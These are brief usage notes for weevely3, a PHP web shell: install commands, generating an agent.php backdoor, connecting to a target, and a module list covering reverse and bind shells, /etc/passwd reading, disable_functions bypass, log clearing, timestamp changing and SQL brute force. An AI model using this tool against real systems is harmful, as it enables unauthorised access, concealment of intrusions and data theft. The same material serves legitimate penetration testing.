# Repo
https://github.com/epinna/weevely3

# Wiki
https://github.com/epinna/weevely3/wiki


```sh
# install
apt install -y python3 python3-pip curl

git clone https://github.com/epinna/weevely3
cd weevely3
pip3 install -r requirements.txt --upgrade

# generate
./weevely.py generate mypassword agent.php

# usage
./weevely.py http://target/agent.php mypassword
```


# Commands
======================================================================================================
command                         | description
======================================================================================================
:audit_filesystem	            | Audit the file system for weak permissions.
:audit_suidsgid	                | Find files with SUID or SGID flags.
:audit_disablefunctionbypass    | Bypass disable_function restrictions with mod_cgi and .htaccess.
:audit_etcpasswd	            | Read /etc/passwd with different techniques.
:audit_phpconf	                | Audit PHP configuration.
:shell_sh	                    | Execute shell commands.
:shell_ssh	                    | Execute shell commands through SSH.
:shell_su	                    | Execute commands with su.
:shell_php	                    | Execute PHP commands.
:system_extensions	            | Collect PHP and webserver extension list.
:system_info	                | Collect system information.
:system_procs	                | List running processes.
:backdoor_reversetcp	        | Execute a reverse TCP shell.
:backdoor_tcp	                | Spawn a shell on a TCP port.
:bruteforce_sql	                | Bruteforce SQL database.
:file_gzip	                    | Compress or expand gzip files.
:file_clearlog	                | Remove string from a file.
:file_check	                    | Get attributes and permissions of a file.
:file_upload	                | Upload file to remote filesystem.
:file_webdownload	            | Download an URL.
:file_tar	                    | Compress or expand tar archives.
:file_download	                | Download file from remote filesystem.
:file_bzip2	                    | Compress or expand bzip2 files.
:file_edit	                    | Edit remote file on a local editor.
:file_grep	                    | Print lines matching a pattern in multiple files.
:file_ls	                    | List directory content.
:file_cp	                    | Copy single file.
:file_rm	                    | Remove remote file.
:file_upload2web	            | Upload file automatically to a web folder and get corresponding URL.
:file_zip	                    | Compress or expand zip files.
:file_touch	                    | Change file timestamp.
:file_find	                    | Find files with given names and attributes.
:file_mount                     | Mount remote filesystem using HTTPfs.
:file_enum	                    | Check existence and permissions of a list of paths.
:file_read	                    | Read remote file from the remote filesystem.
:file_cd	                    | Change current working directory.
:sql_console	                | Execute SQL query or run console.
:sql_dump	                    | Multi dbms mysqldump replacement.
:net_mail	                    | Send mail.
:net_phpproxy	                | Install PHP proxy on the target.
:net_curl	                    | Perform a curl-like HTTP request.
:net_proxy	                    | Run local proxy to pivot HTTP/HTTPS browsing through the target.
:net_scan	                    | TCP Port scan.
:net_ifconfig	                | Get network interfaces addresses.
======================================================================================================